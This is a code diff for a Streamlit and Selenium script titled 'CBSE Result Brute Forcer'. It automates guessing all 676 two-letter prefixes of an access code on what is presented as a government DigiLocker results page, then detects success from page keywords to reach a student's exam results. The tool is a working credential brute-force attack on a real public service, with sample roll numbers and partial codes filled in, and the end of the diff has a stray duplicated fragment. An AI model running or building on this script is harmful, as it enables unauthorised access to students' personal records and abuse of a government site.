@@ -5,19 +5,7 @@ from selenium.common.exceptions import NoSuchElementException
 import time
 import string
 
-st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer")
-
-roll_number = st.text_input("Roll Number", value="18615907")
-known_last_6 = st.text_input("Known Last 6 Characters", value="074511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 1.5, 0.5, 2.5)
-
-if st.button("🚀 Start Brute Force", type="primary"):
-    if len(known_last_6) != 6:
-        st.error("Last 6 must be exactly 6 characters.")
-    else:
-        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)
-
+# ====================== FUNCTIONS FIRST ======================
 def run_brute_force(roll_number, known_last_6, delay):
     status = st.empty()
     progress = st.empty()
@@ -34,7 +22,7 @@ def run_brute_force(roll_number, known_last_6, delay):
     try:
         driver = webdriver.Chrome(options=options)
         driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
-        status.success("✅ Started. Searching...")
+        status.success("✅ Browser started. Searching combinations...")
 
         letters = string.ascii_uppercase
         count = 0
@@ -43,7 +31,7 @@ def run_brute_force(roll_number, known_last_6, delay):
             for b in letters:
                 code = f"{a}{b}{known_last_6}"
                 count += 1
-                progress.info(f"Progress: {count}/676 | Trying **{a}{b}** → `{code}`")
+                progress.info(f"**Progress:** {count}/676 | Trying: **{a}{b}** → `{code}`")
 
                 try:
                     driver.find_element(By.ID, "rroll").clear()
@@ -61,6 +49,49 @@ def run_brute_force(roll_number, known_last_6, delay):
 
                         **Full Code:** `{code}`
                         **Prefix:** `{a}{b}`
+                        """)
+                        st.balloons()
+                        return
+                except:
+                    continue
+
+        st.error("❌ Not found after 676 attempts.")
+
+    except Exception as e:
+        st.error(f"Error: {e}")
+    finally:
+        if driver:
+            driver.quit()
+
+
+def is_success(driver):
+    try:
+        error = driver.find_element(By.ID, "err_msg")
+        if error.is_displayed() and error.text.strip():
+            return False
+    except NoSuchElementException:
+        pass
+
+    page_text = driver.page_source.lower()
+    success_keywords = ["marks", "subject", "grade", "total", "result", "passed", "percentage"]
+    return any(kw in page_text for kw in success_keywords)
+
+
+# ====================== MAIN STREAMLIT UI ======================
+st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
+st.title("🔍 CBSE 12th Result Brute Forcer")
+
+roll_number = st.text_input("Roll Number", value="18615900")
+known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
+delay = st.slider("Delay between attempts (seconds)", 1.5, 0.5, 2.5)
+
+if st.button("🚀 Start Brute Force", type="primary"):
+    if len(known_last_6) != 6:
+        st.error("Last 6 characters must be exactly 6.")
+    elif not roll_number:
+        st.error("Please enter Roll Number.")
+    else:
+        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)                        **Prefix:** `{a}{b}`
                         """)
                         st.balloons()
                         return
